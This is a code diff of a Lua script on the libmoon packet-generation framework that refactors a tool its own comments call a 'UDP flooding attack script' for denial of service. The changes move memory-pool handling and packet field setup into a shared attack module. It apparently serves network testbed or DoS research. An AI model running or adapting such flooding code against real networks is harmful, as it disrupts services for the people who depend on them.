@@ -1,4 +1,4 @@
---- A simple UDP packet generator
+--- A simple UDP flooding attack script
 local libmoon = require "libmoon"
 local log = require "log"
 local memory = require "memory"
@@ -11,8 +11,8 @@ local ffi = require "ffi"
 
 -- the configure function is called on startup with a pre-initialized command line parser
 function configure(parser)
-    attack.configure_pars(parser)
-    parser:description("UDP Flooding DoS Attack.")
+	attack.configure_pars(parser)
+	parser:description("UDP Flooding Attack.")
 
 	parser:option("--pktLength", "Packet length of udp packets."):args(1):convert(tonumber):default(60)
 
@@ -76,10 +76,12 @@ function txTask(threadId, queue, args)
 		end
 	end
 
-	local udpPkt = createUDPPkt(args)
-
 	local mempool = memory.createMemPool()
 	local bufs = mempool:bufArray()
+
+	local udpPkt = createUDPPkt(args, mempool)
+
+	attack.modifyPkt(udpPkt, args)
 
 	attack.txTask_sync_start(args)
 
@@ -150,18 +152,14 @@ end
 rxTask = attack.rxTask
 
 
-function createUDPPkt(args)
+function createUDPPkt(args, mempool)
 	local PKT_LEN = args.pktLength
 
 	-- raw packet
 	local res = ffi.new("uint8_t [?]", PKT_LEN)
 
-	local mempool = memory:createMemPool()
 	local bufArray = mempool:bufArray()
 
-	-- Need buffer to create Wireguard initiation packet stack.
-	-- TODO: find a way to cast buffer directly to WG init pkt stack.
-	-- allocate one buffer (wireguard initiation packet size).
 	bufArray:alloc(PKT_LEN, 1)
 
 	local buf = bufArray[1]
@@ -169,14 +167,10 @@ function createUDPPkt(args)
 
 	pkt:fill{
 		-- fields not explicitly set here are initialized to reasonable defaults
-		udpSrc = args.udpSrc,
-		udpDst = args.udpDst,
-		ethSrc = args.ethSrc, 
-		ethDst = args.ethDst,
-		ip4Src = args.ip4Src,
-		ip4Dst = args.ip4Dst,
 		pktLength = args.pktLength
 	}
+
+	attack.modifyPkt(buf, args)
 
 	-- similar to pkt:setRawPacket
 	ffi.copy(res, pkt, PKT_LEN)
